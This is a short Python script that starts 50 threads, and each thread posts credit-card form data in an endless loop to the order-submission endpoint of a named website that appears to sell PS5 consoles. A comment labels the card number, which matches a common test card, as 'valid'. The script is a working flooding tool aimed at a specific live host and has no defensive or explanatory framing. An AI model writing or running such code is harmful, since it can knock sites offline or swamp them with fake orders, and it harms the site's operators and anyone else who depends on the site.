import requests
import threading
# valid card: 4007000000027


url = 'https://luckypro12.com/PS5/includes/submit_order_limelight.php'

data = {
	'cc_number': '4007000000027',
	'cc_expmonth': '08',
	'cc_expyear': '21',
	'cc_cvv': '234',
}



def do_requests():

	while True:
		response = requests.post(url, data=data).text
		print(response)

threads = []

for i in range(50):
	t = threading.Thread(target=do_requests)
	t.daemon = True
	threads.append(t)

for i in range(50):
	threads[i].start()

for i in range(50):
	threads[i].join()